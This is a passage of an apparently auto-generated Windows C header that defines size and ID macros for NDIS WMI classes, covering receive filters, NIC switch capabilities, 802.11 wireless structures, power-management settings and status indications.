#define WmiQueryReceiveFilterParameters_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveFilterParameters_IN_Header_ID 1
#define WmiQueryReceiveFilterParameters_IN_ReceiveFilterParameters_SIZE sizeof(MSNdis_ReceiveFilterParameters)
#define WmiQueryReceiveFilterParameters_IN_ReceiveFilterParameters_ID 2

#define WmiQueryReceiveFilterParameters_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterParameters_IN, ReceiveFilterParameters) + WmiQueryReceiveFilterParameters_IN_ReceiveFilterParameters_SIZE)

#define WmiQueryReceiveFilterParameters_OUT_ReceiveFilterParameters_SIZE sizeof(MSNdis_ReceiveFilterParameters)
#define WmiQueryReceiveFilterParameters_OUT_ReceiveFilterParameters_ID 2

#define WmiQueryReceiveFilterParameters_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterParameters_OUT, ReceiveFilterParameters) + WmiQueryReceiveFilterParameters_OUT_ReceiveFilterParameters_SIZE)

#define WmiQueryReceiveFilterCurrentCapabilities     1

#define WmiQueryReceiveFilterCurrentCapabilities_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveFilterCurrentCapabilities_IN_Header_ID 1

#define WmiQueryReceiveFilterCurrentCapabilities_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterCurrentCapabilities_IN, Header) + WmiQueryReceiveFilterCurrentCapabilities_IN_Header_SIZE)

#define WmiQueryReceiveFilterCurrentCapabilities_OUT_ReceiveFilterCurrentCapabilities_SIZE sizeof(MSNdis_ReceiveFilterCapabilities)
#define WmiQueryReceiveFilterCurrentCapabilities_OUT_ReceiveFilterCurrentCapabilities_ID 2

#define WmiQueryReceiveFilterCurrentCapabilities_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterCurrentCapabilities_OUT, ReceiveFilterCurrentCapabilities) + WmiQueryReceiveFilterCurrentCapabilities_OUT_ReceiveFilterCurrentCapabilities_SIZE)

#define WmiQueryNICSwitchHardwareCapabilities     1

#define WmiQueryNICSwitchHardwareCapabilities_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryNICSwitchHardwareCapabilities_IN_Header_ID 1

#define WmiQueryNICSwitchHardwareCapabilities_IN_SIZE (FIELD_OFFSET(WmiQueryNICSwitchHardwareCapabilities_IN, Header) + WmiQueryNICSwitchHardwareCapabilities_IN_Header_SIZE)

#define WmiQueryNICSwitchHardwareCapabilities_OUT_NicSwitchHardwareCapabilities_SIZE sizeof(MSNdis_NicSwitchCapabilities)
#define WmiQueryNICSwitchHardwareCapabilities_OUT_NicSwitchHardwareCapabilities_ID 2

#define WmiQueryNICSwitchHardwareCapabilities_OUT_SIZE (FIELD_OFFSET(WmiQueryNICSwitchHardwareCapabilities_OUT, NicSwitchHardwareCapabilities) + WmiQueryNICSwitchHardwareCapabilities_OUT_NicSwitchHardwareCapabilities_SIZE)

#define WmiQueryNICSwitchCurrentCapabilities     1

#define WmiQueryNICSwitchCurrentCapabilities_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryNICSwitchCurrentCapabilities_IN_Header_ID 1

#define WmiQueryNICSwitchCurrentCapabilities_IN_SIZE (FIELD_OFFSET(WmiQueryNICSwitchCurrentCapabilities_IN, Header) + WmiQueryNICSwitchCurrentCapabilities_IN_Header_SIZE)

#define WmiQueryNICSwitchCurrentCapabilities_OUT_NicSwitchCurrentCapabilities_SIZE sizeof(MSNdis_NicSwitchCapabilities)
#define WmiQueryNICSwitchCurrentCapabilities_OUT_NicSwitchCurrentCapabilities_ID 2

#define WmiQueryNICSwitchCurrentCapabilities_OUT_SIZE (FIELD_OFFSET(WmiQueryNICSwitchCurrentCapabilities_OUT, NicSwitchCurrentCapabilities) + WmiQueryNICSwitchCurrentCapabilities_OUT_NicSwitchCurrentCapabilities_SIZE)

#define WmiQueryReceiveQueueParameters     1

#define WmiQueryReceiveQueueParameters_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveQueueParameters_IN_Header_ID 1
#define WmiQueryReceiveQueueParameters_IN_ReceiveQueueParameters_SIZE sizeof(MSNdis_ReceiveQueueParameters)
#define WmiQueryReceiveQueueParameters_IN_ReceiveQueueParameters_ID 2

#define WmiQueryReceiveQueueParameters_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveQueueParameters_IN, ReceiveQueueParameters) + WmiQueryReceiveQueueParameters_IN_ReceiveQueueParameters_SIZE)

#define WmiQueryReceiveQueueParameters_OUT_ReceiveQueueParameters_SIZE sizeof(MSNdis_ReceiveQueueParameters)
#define WmiQueryReceiveQueueParameters_OUT_ReceiveQueueParameters_ID 2

#define WmiQueryReceiveQueueParameters_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveQueueParameters_OUT, ReceiveQueueParameters) + WmiQueryReceiveQueueParameters_OUT_ReceiveQueueParameters_SIZE)

#define WmiEnumReceiveQueues     1

#define WmiEnumReceiveQueues_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiEnumReceiveQueues_IN_Header_ID 1
#define WmiEnumReceiveQueues_IN_ReceiveQueueInfoArray_SIZE sizeof(MSNdis_ReceiveQueueInfoArray)
#define WmiEnumReceiveQueues_IN_ReceiveQueueInfoArray_ID 2

#define WmiEnumReceiveQueues_IN_SIZE (FIELD_OFFSET(WmiEnumReceiveQueues_IN, ReceiveQueueInfoArray) + WmiEnumReceiveQueues_IN_ReceiveQueueInfoArray_SIZE)

#define WmiEnumReceiveQueues_OUT_ReceiveQueueInfoArray_SIZE sizeof(MSNdis_ReceiveQueueInfoArray)
#define WmiEnumReceiveQueues_OUT_ReceiveQueueInfoArray_ID 2

#define WmiEnumReceiveQueues_OUT_SIZE (FIELD_OFFSET(WmiEnumReceiveQueues_OUT, ReceiveQueueInfoArray) + WmiEnumReceiveQueues_OUT_ReceiveQueueInfoArray_SIZE)

#define MSNdis_80211_BaseServiceSetIdentifier_Ndis80211MacAddress_SIZE sizeof(UCHAR[6])
#define MSNdis_80211_BaseServiceSetIdentifier_Ndis80211MacAddress_ID 1

#define MSNdis_80211_BaseServiceSetIdentifier_SIZE (FIELD_OFFSET(MSNdis_80211_BaseServiceSetIdentifier, Ndis80211MacAddress) + MSNdis_80211_BaseServiceSetIdentifier_Ndis80211MacAddress_SIZE)

#define MSNdis_80211_ServiceSetIdentifier_Ndis80211SsId_SIZE sizeof(UCHAR[33])
#define MSNdis_80211_ServiceSetIdentifier_Ndis80211SsId_ID 1

#define MSNdis_80211_ServiceSetIdentifier_SIZE (FIELD_OFFSET(MSNdis_80211_ServiceSetIdentifier, Ndis80211SsId) + MSNdis_80211_ServiceSetIdentifier_Ndis80211SsId_SIZE)

#define MSNdis_80211_NetworkType_Ndis80211NetworkType_SIZE sizeof(ULONG)
#define MSNdis_80211_NetworkType_Ndis80211NetworkType_ID 1

#define MSNdis_80211_NetworkType_SIZE (FIELD_OFFSET(MSNdis_80211_NetworkType, Ndis80211NetworkType) + MSNdis_80211_NetworkType_Ndis80211NetworkType_SIZE)

#define MSNdis_80211_NetworkTypesSupported_NumberOfItems_SIZE sizeof(ULONG)
#define MSNdis_80211_NetworkTypesSupported_NumberOfItems_ID 1
#define MSNdis_80211_NetworkTypesSupported_Ndis80211NetworkTypes_ID 2

#define MSNdis_80211_NetworkTypeInUse_Ndis80211NetworkTypeInUse_SIZE sizeof(MSNdis_80211_NetworkType)
#define MSNdis_80211_NetworkTypeInUse_Ndis80211NetworkTypeInUse_ID 1

#define MSNdis_80211_NetworkTypeInUse_SIZE (FIELD_OFFSET(MSNdis_80211_NetworkTypeInUse, Ndis80211NetworkTypeInUse) + MSNdis_80211_NetworkTypeInUse_Ndis80211NetworkTypeInUse_SIZE)

#define MSNdis_80211_PowerMode_Ndis80211PowerMode_SIZE sizeof(ULONG)
#define MSNdis_80211_PowerMode_Ndis80211PowerMode_ID 1

#define MSNdis_80211_PowerMode_SIZE (FIELD_OFFSET(MSNdis_80211_PowerMode, Ndis80211PowerMode) + MSNdis_80211_PowerMode_Ndis80211PowerMode_SIZE)

#define MSNdis_80211_TransmitPowerLevel_Ndis80211TransmitPowerLevel_SIZE sizeof(ULONG)
#define MSNdis_80211_TransmitPowerLevel_Ndis80211TransmitPowerLevel_ID 1

#define MSNdis_80211_TransmitPowerLevel_SIZE (FIELD_OFFSET(MSNdis_80211_TransmitPowerLevel, Ndis80211TransmitPowerLevel) + MSNdis_80211_TransmitPowerLevel_Ndis80211TransmitPowerLevel_SIZE)

#define MSNdis_80211_ReceivedSignalStrength_Ndis80211ReceivedSignalStrength_SIZE sizeof(LONG)
#define MSNdis_80211_ReceivedSignalStrength_Ndis80211ReceivedSignalStrength_ID 1

#define MSNdis_80211_ReceivedSignalStrength_SIZE (FIELD_OFFSET(MSNdis_80211_ReceivedSignalStrength, Ndis80211ReceivedSignalStrength) + MSNdis_80211_ReceivedSignalStrength_Ndis80211ReceivedSignalStrength_SIZE)

#define MSNdis_80211_ReceivedSignalStrengthEventTrigger_Ndis80211ReceivedSignalStrengthTrigger_SIZE sizeof(LONG)
#define MSNdis_80211_ReceivedSignalStrengthEventTrigger_Ndis80211ReceivedSignalStrengthTrigger_ID 1

#define MSNdis_80211_ReceivedSignalStrengthEventTrigger_SIZE (FIELD_OFFSET(MSNdis_80211_ReceivedSignalStrengthEventTrigger, Ndis80211ReceivedSignalStrengthTrigger) + MSNdis_80211_ReceivedSignalStrengthEventTrigger_Ndis80211ReceivedSignalStrengthTrigger_SIZE)

#define MSNdis_80211_NetworkInfrastructure_Ndis80211NetworkInfrastructure_SIZE sizeof(ULONG)
#define MSNdis_80211_NetworkInfrastructure_Ndis80211NetworkInfrastructure_ID 1

#define MSNdis_80211_NetworkInfrastructure_SIZE (FIELD_OFFSET(MSNdis_80211_NetworkInfrastructure, Ndis80211NetworkInfrastructure) + MSNdis_80211_NetworkInfrastructure_Ndis80211NetworkInfrastructure_SIZE)

#define MSNdis_80211_ConfigurationFH_FHLength_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationFH_FHLength_ID 1
#define MSNdis_80211_ConfigurationFH_HopPattern_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationFH_HopPattern_ID 2
#define MSNdis_80211_ConfigurationFH_HopSet_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationFH_HopSet_ID 3
#define MSNdis_80211_ConfigurationFH_DwellTime_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationFH_DwellTime_ID 4

#define MSNdis_80211_ConfigurationFH_SIZE (FIELD_OFFSET(MSNdis_80211_ConfigurationFH, DwellTime) + MSNdis_80211_ConfigurationFH_DwellTime_SIZE)

#define MSNdis_80211_ConfigurationInfo_ConfigLength_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationInfo_ConfigLength_ID 1
#define MSNdis_80211_ConfigurationInfo_BeaconPeriod_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationInfo_BeaconPeriod_ID 2
#define MSNdis_80211_ConfigurationInfo_ATIMWindow_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationInfo_ATIMWindow_ID 3
#define MSNdis_80211_ConfigurationInfo_DSConfig_SIZE sizeof(ULONG)
#define MSNdis_80211_ConfigurationInfo_DSConfig_ID 4
#define MSNdis_80211_ConfigurationInfo_FHConfig_SIZE sizeof(MSNdis_80211_ConfigurationFH)
#define MSNdis_80211_ConfigurationInfo_FHConfig_ID 5

#define MSNdis_80211_ConfigurationInfo_SIZE (FIELD_OFFSET(MSNdis_80211_ConfigurationInfo, FHConfig) + MSNdis_80211_ConfigurationInfo_FHConfig_SIZE)

#define MSNdis_80211_WLanBssId_Ndis80211WLanBssIdLength_SIZE sizeof(ULONG)
#define MSNdis_80211_WLanBssId_Ndis80211WLanBssIdLength_ID 1
#define MSNdis_80211_WLanBssId_Ndis80211MacAddress_SIZE sizeof(UCHAR[6])
#define MSNdis_80211_WLanBssId_Ndis80211MacAddress_ID 2
#define MSNdis_80211_WLanBssId_Reserved_SIZE sizeof(USHORT)
#define MSNdis_80211_WLanBssId_Reserved_ID 3
#define MSNdis_80211_WLanBssId_Ndis80211SsIdLength_SIZE sizeof(ULONG)
#define MSNdis_80211_WLanBssId_Ndis80211SsIdLength_ID 4
#define MSNdis_80211_WLanBssId_Ndis80211SsId_SIZE sizeof(UCHAR[32])
#define MSNdis_80211_WLanBssId_Ndis80211SsId_ID 5
#define MSNdis_80211_WLanBssId_Ndis80211Privacy_SIZE sizeof(ULONG)
#define MSNdis_80211_WLanBssId_Ndis80211Privacy_ID 6
#define MSNdis_80211_WLanBssId_Ndis80211Rssi_SIZE sizeof(ULONG)
#define MSNdis_80211_WLanBssId_Ndis80211Rssi_ID 7
#define MSNdis_80211_WLanBssId_Ndis80211NetworkTypeInUse_SIZE sizeof(MSNdis_80211_NetworkType)
#define MSNdis_80211_WLanBssId_Ndis80211NetworkTypeInUse_ID 8
#define MSNdis_80211_WLanBssId_Ndis80211Configuration_SIZE sizeof(MSNdis_80211_ConfigurationInfo)
#define MSNdis_80211_WLanBssId_Ndis80211Configuration_ID 9
#define MSNdis_80211_WLanBssId_Ndis80211InfrastructureMode_SIZE sizeof(MSNdis_80211_NetworkInfrastructure)
#define MSNdis_80211_WLanBssId_Ndis80211InfrastructureMode_ID 10
#define MSNdis_80211_WLanBssId_Ndis80211SupportedRate_SIZE sizeof(UCHAR[8])
#define MSNdis_80211_WLanBssId_Ndis80211SupportedRate_ID 11

#define MSNdis_80211_WLanBssId_SIZE (FIELD_OFFSET(MSNdis_80211_WLanBssId, Ndis80211SupportedRate) + MSNdis_80211_WLanBssId_Ndis80211SupportedRate_SIZE)

#define MSNdis_80211_BSSIList_NumberOfItems_SIZE sizeof(ULONG)
#define MSNdis_80211_BSSIList_NumberOfItems_ID 1
#define MSNdis_80211_BSSIList_Ndis80211BSSIList_ID 2

#define MSNdis_80211_InfrastructureMode_Ndis80211InfrastructureMode_SIZE sizeof(MSNdis_80211_NetworkInfrastructure)
#define MSNdis_80211_InfrastructureMode_Ndis80211InfrastructureMode_ID 1

#define MSNdis_80211_InfrastructureMode_SIZE (FIELD_OFFSET(MSNdis_80211_InfrastructureMode, Ndis80211InfrastructureMode) + MSNdis_80211_InfrastructureMode_Ndis80211InfrastructureMode_SIZE)

#define MSNdis_80211_FragmentationThreshold_Ndis80211FragmentationThreshold_SIZE sizeof(ULONG)
#define MSNdis_80211_FragmentationThreshold_Ndis80211FragmentationThreshold_ID 1

#define MSNdis_80211_FragmentationThreshold_SIZE (FIELD_OFFSET(MSNdis_80211_FragmentationThreshold, Ndis80211FragmentationThreshold) + MSNdis_80211_FragmentationThreshold_Ndis80211FragmentationThreshold_SIZE)

#define MSNdis_80211_RTSThreshold_Ndis80211RTSThreshold_SIZE sizeof(ULONG)
#define MSNdis_80211_RTSThreshold_Ndis80211RTSThreshold_ID 1

#define MSNdis_80211_RTSThreshold_SIZE (FIELD_OFFSET(MSNdis_80211_RTSThreshold, Ndis80211RTSThreshold) + MSNdis_80211_RTSThreshold_Ndis80211RTSThreshold_SIZE)

#define MSNdis_80211_NumberOfAntennas_Ndis80211NumberOfAntennas_SIZE sizeof(ULONG)
#define MSNdis_80211_NumberOfAntennas_Ndis80211NumberOfAntennas_ID 1

#define MSNdis_80211_NumberOfAntennas_SIZE (FIELD_OFFSET(MSNdis_80211_NumberOfAntennas, Ndis80211NumberOfAntennas) + MSNdis_80211_NumberOfAntennas_Ndis80211NumberOfAntennas_SIZE)

#define MSNdis_80211_ReceiveAntennaSelected_Ndis80211ReceiveAntennaSelected_SIZE sizeof(ULONG)
#define MSNdis_80211_ReceiveAntennaSelected_Ndis80211ReceiveAntennaSelected_ID 1

#define MSNdis_80211_ReceiveAntennaSelected_SIZE (FIELD_OFFSET(MSNdis_80211_ReceiveAntennaSelected, Ndis80211ReceiveAntennaSelected) + MSNdis_80211_ReceiveAntennaSelected_Ndis80211ReceiveAntennaSelected_SIZE)

#define MSNdis_80211_TransmitAntennaSelected_Ndis80211TransmitAntennaSelected_SIZE sizeof(ULONG)
#define MSNdis_80211_TransmitAntennaSelected_Ndis80211TransmitAntennaSelected_ID 1

#define MSNdis_80211_TransmitAntennaSelected_SIZE (FIELD_OFFSET(MSNdis_80211_TransmitAntennaSelected, Ndis80211TransmitAntennaSelected) + MSNdis_80211_TransmitAntennaSelected_Ndis80211TransmitAntennaSelected_SIZE)

#define MSNdis_80211_DataRates_Ndis80211DataRate_SIZE sizeof(UCHAR[8])
#define MSNdis_80211_DataRates_Ndis80211DataRate_ID 1

#define MSNdis_80211_DataRates_SIZE (FIELD_OFFSET(MSNdis_80211_DataRates, Ndis80211DataRate) + MSNdis_80211_DataRates_Ndis80211DataRate_SIZE)

#define MSNdis_80211_DesiredDataRates_Ndis80211DesiredRate_SIZE sizeof(UCHAR[8])
#define MSNdis_80211_DesiredDataRates_Ndis80211DesiredRate_ID 1

#define MSNdis_80211_DesiredDataRates_SIZE (FIELD_OFFSET(MSNdis_80211_DesiredDataRates, Ndis80211DesiredRate) + MSNdis_80211_DesiredDataRates_Ndis80211DesiredRate_SIZE)

#define MSNdis_80211_Configuration_Ndis80211Config_SIZE sizeof(MSNdis_80211_ConfigurationInfo)
#define MSNdis_80211_Configuration_Ndis80211Config_ID 1

#define MSNdis_80211_Configuration_SIZE (FIELD_OFFSET(MSNdis_80211_Configuration, Ndis80211Config) + MSNdis_80211_Configuration_Ndis80211Config_SIZE)

#define MSNdis_80211_Statistics_StatisticsLength_SIZE sizeof(ULONG)
#define MSNdis_80211_Statistics_StatisticsLength_ID 1
#define MSNdis_80211_Statistics_TransmittedFragmentCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_TransmittedFragmentCount_ID 2
#define MSNdis_80211_Statistics_MulticastTransmittedFrameCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_MulticastTransmittedFrameCount_ID 3
#define MSNdis_80211_Statistics_FailedCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_FailedCount_ID 4
#define MSNdis_80211_Statistics_RetryCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_RetryCount_ID 5
#define MSNdis_80211_Statistics_MultipleRetryCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_MultipleRetryCount_ID 6
#define MSNdis_80211_Statistics_RTSSuccessCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_RTSSuccessCount_ID 7
#define MSNdis_80211_Statistics_RTSFailureCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_RTSFailureCount_ID 8
#define MSNdis_80211_Statistics_ACKFailureCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_ACKFailureCount_ID 9
#define MSNdis_80211_Statistics_FrameDuplicateCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_FrameDuplicateCount_ID 10
#define MSNdis_80211_Statistics_ReceivedFragmentCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_ReceivedFragmentCount_ID 11
#define MSNdis_80211_Statistics_MulticastReceivedFrameCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_MulticastReceivedFrameCount_ID 12
#define MSNdis_80211_Statistics_FCSErrorCount_SIZE sizeof(ULONGLONG)
#define MSNdis_80211_Statistics_FCSErrorCount_ID 13

#define MSNdis_80211_Statistics_SIZE (FIELD_OFFSET(MSNdis_80211_Statistics, FCSErrorCount) + MSNdis_80211_Statistics_FCSErrorCount_SIZE)

#define MSNdis_80211_AddWEP_Length_SIZE sizeof(ULONG)
#define MSNdis_80211_AddWEP_Length_ID 1
#define MSNdis_80211_AddWEP_KeyIndex_SIZE sizeof(ULONG)
#define MSNdis_80211_AddWEP_KeyIndex_ID 2
#define MSNdis_80211_AddWEP_KeyLength_SIZE sizeof(ULONG)
#define MSNdis_80211_AddWEP_KeyLength_ID 3
#define MSNdis_80211_AddWEP_KeyMaterial_ID 4

#define MSNdis_80211_RemoveWEP_Ndis80211KeyIndex_SIZE sizeof(ULONG)
#define MSNdis_80211_RemoveWEP_Ndis80211KeyIndex_ID 1

#define MSNdis_80211_RemoveWEP_SIZE (FIELD_OFFSET(MSNdis_80211_RemoveWEP, Ndis80211KeyIndex) + MSNdis_80211_RemoveWEP_Ndis80211KeyIndex_SIZE)

#define MSNdis_80211_Disassociate_UnusedParameter_SIZE sizeof(ULONG)
#define MSNdis_80211_Disassociate_UnusedParameter_ID 1

#define MSNdis_80211_Disassociate_SIZE (FIELD_OFFSET(MSNdis_80211_Disassociate, UnusedParameter) + MSNdis_80211_Disassociate_UnusedParameter_SIZE)

#define MSNdis_80211_BssIdListScan_UnusedParameter_SIZE sizeof(ULONG)
#define MSNdis_80211_BssIdListScan_UnusedParameter_ID 1

#define MSNdis_80211_BssIdListScan_SIZE (FIELD_OFFSET(MSNdis_80211_BssIdListScan, UnusedParameter) + MSNdis_80211_BssIdListScan_UnusedParameter_SIZE)

#define MSNdis_80211_AuthenticationMode_Ndis80211AuthenticationMode_SIZE sizeof(ULONG)
#define MSNdis_80211_AuthenticationMode_Ndis80211AuthenticationMode_ID 1

#define MSNdis_80211_AuthenticationMode_SIZE (FIELD_OFFSET(MSNdis_80211_AuthenticationMode, Ndis80211AuthenticationMode) + MSNdis_80211_AuthenticationMode_Ndis80211AuthenticationMode_SIZE)

#define MSNdis_80211_PrivacyFilter_Ndis80211PrivacyFilter_SIZE sizeof(ULONG)
#define MSNdis_80211_PrivacyFilter_Ndis80211PrivacyFilter_ID 1

#define MSNdis_80211_PrivacyFilter_SIZE (FIELD_OFFSET(MSNdis_80211_PrivacyFilter, Ndis80211PrivacyFilter) + MSNdis_80211_PrivacyFilter_Ndis80211PrivacyFilter_SIZE)

#define MSNdis_80211_WEPStatus_Ndis80211WEPStatus_SIZE sizeof(ULONG)
#define MSNdis_80211_WEPStatus_Ndis80211WEPStatus_ID 1

#define MSNdis_80211_WEPStatus_SIZE (FIELD_OFFSET(MSNdis_80211_WEPStatus, Ndis80211WEPStatus) + MSNdis_80211_WEPStatus_Ndis80211WEPStatus_SIZE)

#define MSNdis_80211_ReloadDefaults_Ndis80211ReloadDefaults_SIZE sizeof(ULONG)
#define MSNdis_80211_ReloadDefaults_Ndis80211ReloadDefaults_ID 1

#define MSNdis_80211_ReloadDefaults_SIZE (FIELD_OFFSET(MSNdis_80211_ReloadDefaults, Ndis80211ReloadDefaults) + MSNdis_80211_ReloadDefaults_Ndis80211ReloadDefaults_SIZE)

#define MSNdis_PMAdminConfigState_NdisPMAdminConfigState_SIZE sizeof(ULONG)
#define MSNdis_PMAdminConfigState_NdisPMAdminConfigState_ID 1

#define MSNdis_PMAdminConfigState_SIZE (FIELD_OFFSET(MSNdis_PMAdminConfigState, NdisPMAdminConfigState) + MSNdis_PMAdminConfigState_NdisPMAdminConfigState_SIZE)

#define MSNdis_PMAdminConfigParam_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PMAdminConfigParam_Header_ID 1
#define MSNdis_PMAdminConfigParam_WakeOnPattern_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_WakeOnPattern_ID 2
#define MSNdis_PMAdminConfigParam_WakeOnMagicPacket_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_WakeOnMagicPacket_ID 3
#define MSNdis_PMAdminConfigParam_DeviceSleepOnDisconnect_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_DeviceSleepOnDisconnect_ID 4
#define MSNdis_PMAdminConfigParam_PMARPOffload_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_PMARPOffload_ID 5
#define MSNdis_PMAdminConfigParam_PMNDOffload_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_PMNDOffload_ID 6
#define MSNdis_PMAdminConfigParam_PMWiFiRekeyOffload_SIZE sizeof(MSNdis_PMAdminConfigState)
#define MSNdis_PMAdminConfigParam_PMWiFiRekeyOffload_ID 7

#define MSNdis_PMAdminConfigParam_SIZE (FIELD_OFFSET(MSNdis_PMAdminConfigParam, PMWiFiRekeyOffload) + MSNdis_PMAdminConfigParam_PMWiFiRekeyOffload_SIZE)

#define MSNdis_PMAdminConfig_PMAdminConfigParam_SIZE sizeof(MSNdis_PMAdminConfigParam)
#define MSNdis_PMAdminConfig_PMAdminConfigParam_ID 1

#define MSNdis_PMAdminConfig_SIZE (FIELD_OFFSET(MSNdis_PMAdminConfig, PMAdminConfigParam) + MSNdis_PMAdminConfig_PMAdminConfigParam_SIZE)

#define MSNdis_PMCapabilityState_NdisPMCapabilityState_SIZE sizeof(ULONG)
#define MSNdis_PMCapabilityState_NdisPMCapabilityState_ID 1

#define MSNdis_PMCapabilityState_SIZE (FIELD_OFFSET(MSNdis_PMCapabilityState, NdisPMCapabilityState) + MSNdis_PMCapabilityState_NdisPMCapabilityState_SIZE)

#define MSNdis_PMCapabilitiesParam_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PMCapabilitiesParam_Header_ID 1
#define MSNdis_PMCapabilitiesParam_WakeOnPattern_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_WakeOnPattern_ID 2
#define MSNdis_PMCapabilitiesParam_WakeOnMagicPacket_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_WakeOnMagicPacket_ID 3
#define MSNdis_PMCapabilitiesParam_DeviceSleepOnDisconnect_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_DeviceSleepOnDisconnect_ID 4
#define MSNdis_PMCapabilitiesParam_PMARPOffload_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_PMARPOffload_ID 5
#define MSNdis_PMCapabilitiesParam_PMNDOffload_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_PMNDOffload_ID 6
#define MSNdis_PMCapabilitiesParam_PMWiFiRekeyOffload_SIZE sizeof(MSNdis_PMCapabilityState)
#define MSNdis_PMCapabilitiesParam_PMWiFiRekeyOffload_ID 7

#define MSNdis_PMCapabilitiesParam_SIZE (FIELD_OFFSET(MSNdis_PMCapabilitiesParam, PMWiFiRekeyOffload) + MSNdis_PMCapabilitiesParam_PMWiFiRekeyOffload_SIZE)

#define MSNdis_PMCapabilities_PMCapabilitiesParam_SIZE sizeof(MSNdis_PMCapabilitiesParam)
#define MSNdis_PMCapabilities_PMCapabilitiesParam_ID 1

#define MSNdis_PMCapabilities_SIZE (FIELD_OFFSET(MSNdis_PMCapabilities, PMCapabilitiesParam) + MSNdis_PMCapabilities_PMCapabilitiesParam_SIZE)

#define MSNdis_StatusMediaSpecificIndication_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusMediaSpecificIndication_NumberElements_ID 1
#define MSNdis_StatusMediaSpecificIndication_NdisStatusMediaSpecificIndication_ID 2

#define MSNdis_StatusLinkSpeedChange_NdisStatusLinkSpeedChange_SIZE sizeof(MSNdis_NetworkLinkSpeed)
#define MSNdis_StatusLinkSpeedChange_NdisStatusLinkSpeedChange_ID 1

#define MSNdis_StatusLinkSpeedChange_SIZE (FIELD_OFFSET(MSNdis_StatusLinkSpeedChange, NdisStatusLinkSpeedChange) + MSNdis_StatusLinkSpeedChange_NdisStatusLinkSpeedChange_SIZE)

#define MSNdis_StatusProtocolBind_Transport_ID 1
#define MSNdis_StatusProtocolUnbind_Transport_ID 1
#define MSNdis_StatusDevicePowerOn_Device_ID 1
#define MSNdis_StatusDevicePowerOff_Device_ID 1
#define MSNdis_StatusDevicePowerOnEx_Device_ID 1
#define MSNdis_StatusDevicePowerOffEx_Device_ID 1

#define MSNdis_StatusTaskOffloadChange_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusTaskOffloadChange_NumberElements_ID 1
#define MSNdis_StatusTaskOffloadChange_TaskOffloadCapabilities_ID 2

#define MSNdis_StatusPacketFilterChange_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusPacketFilterChange_NumberElements_ID 1
#define MSNdis_StatusPacketFilterChange_NdisPacketFilterStatusIndication_ID 2

#define MSNdis_StatusNetworkChange_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusNetworkChange_NumberElements_ID 1
#define MSNdis_StatusNetworkChange_NdisNetworkChangeStatusIndication_ID 2

#define MSNdis_StatusOperationalStatus_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusOperationalStatus_NumberElements_ID 1
#define MSNdis_StatusOperationalStatus_NdisOperationalStatusStatusIndication_ID 2

#define MSNdis_StatusLinkState_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusLinkState_NumberElements_ID 1
#define MSNdis_StatusLinkState_NdisLinkStateStatusIndication_ID 2

#define MSNdis_StatusPortState_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusPortState_NumberElements_ID 1
#define MSNdis_StatusPortState_NdisPortStateStatusIndication_ID 2

#define MSNdis_StatusMediaSpecificIndicationEx_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusMediaSpecificIndicationEx_NumberElements_ID 1
#define MSNdis_StatusMediaSpecificIndicationEx_NdisStatusMediaSpecificIndication_ID 2

#define MSNdis_StatusHDSplitCurrentConfig_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusHDSplitCurrentConfig_NumberElements_ID 1
#define MSNdis_StatusHDSplitCurrentConfig_HDSplitCurrentConfig_ID 2

